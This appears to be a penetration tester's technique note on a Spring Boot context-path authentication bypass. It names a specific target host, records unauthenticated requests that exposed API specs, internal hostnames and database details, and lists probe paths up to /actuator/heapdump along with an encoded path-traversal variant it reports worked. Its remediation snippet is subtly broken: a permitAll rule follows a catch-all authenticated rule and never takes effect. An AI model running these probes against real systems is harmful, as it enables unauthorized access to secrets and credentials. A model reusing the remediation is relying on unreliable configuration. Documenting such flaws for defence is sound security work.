# Spring Boot Context-Path Auth Bypass Pattern

## Pattern Summary

When a Spring Boot app serves its API at `/context/api/*` with Spring Security filtering `api/**`, management/documentation endpoints registered at the **context-path level** (not under `/api/`) bypass the auth filter entirely.

## Discovery (AltoCMS, June 2026)

- Target: `https://dashboard-jago.alto-network.com`
- API base: `/jago/api/*` (all 401 without JWT)
- Auth filter: Spring Security covers `/api/**` pattern
- Unprotected: `/jago/v3/api-docs`, `/jago/swagger-ui/`, `/jago/health`

## Why It Happens

Spring Security's `HttpSecurity.authorizeRequests()` typically configures:
```java
.antMatchers("/api/**").authenticated()
```

But springdoc-openapi registers at:
- `/v3/api-docs` (relative to context-path)
- `/swagger-ui/**` (relative to context-path)

And Spring Actuator registers at:
- `/health` (if `management.endpoints.web.base-path=/`)
- `/actuator/**` (default)

These are at `/context/v3/api-docs` NOT `/context/api/v3/api-docs`, so the `/api/**` security rule never matches.

## Mandatory Test Paths

When you find a Spring Boot app at `/context/api/*`:

```
/context/v3/api-docs              <- OpenAPI 3.0 JSON spec
/context/v3/api-docs/swagger-config  <- May leak internal hostnames
/context/v3/api-docs.yaml         <- YAML version
/context/swagger-ui/index.html    <- Interactive Swagger UI
/context/swagger-ui.html          <- Redirect to above
/context/webjars/swagger-ui/*     <- Static resources (confirms Swagger)
/context/swagger-resources        <- Swagger 2.x config
/context/v2/api-docs              <- Swagger 2.0 spec
/context/health                   <- Actuator health
/context/info                     <- Actuator info
/context/actuator                 <- Actuator index
/context/actuator/env             <- Environment variables
/context/actuator/mappings        <- URL mappings
/context/actuator/heapdump        <- Heap dump (critical!)
```

## Impact Levels

| Endpoint | Impact | Notes |
|----------|--------|-------|
| /v3/api-docs | Medium | Full API surface disclosure (95 endpoints, 130 schemas) |
| /swagger-ui | Medium | Interactive testing interface |
| /swagger-config | Low | Internal hostname leak |
| /health | Low | DB type, disk space, component status |
| /actuator/env | Critical | Environment variables, secrets |
| /actuator/heapdump | Critical | Memory dump with credentials |
| /actuator/mappings | Medium | All URL patterns + handlers |

## Evidence (AltoCMS)

```
GET /jago/v3/api-docs -> 200 (97,422 bytes) - Full OpenAPI spec
GET /jago/swagger-ui/index.html -> 200 (734 bytes) - Swagger UI
GET /jago/v3/api-docs/swagger-config -> 200 - Leaked: dashboard-jago.cms.local.alto.id
GET /jago/health -> 200 (505 bytes) - PostgreSQL, disk space
GET /jago/actuator/env -> 401 (auth-gated, different from above)
```

## Path Traversal Variant

If only `/context/api/*` is in scope but you suspect context-path endpoints:
```
/context/api/%2e%2e/v3/api-docs     <- URL-encoded ../ to escape /api/
/context/api/%2e%2e/health          <- May work if Envoy doesn't normalize
/context/api/%2e%2e/swagger-ui/index.html
```

AltoCMS confirmed: `/jago/api/%2e%2e/health` returned the health endpoint (Envoy passed encoded dots).

## Remediation

1. Extend security filter to cover all paths:
   ```java
   .antMatchers("/**").authenticated()
   .antMatchers("/api/auth/**").permitAll()
   ```
2. Or disable springdoc in production:
   ```yaml
   springdoc.api-docs.enabled: false
   springdoc.swagger-ui.enabled: false
   ```
3. Restrict actuator health:
   ```yaml
   management.endpoint.health.show-details: when-authorized
   ```
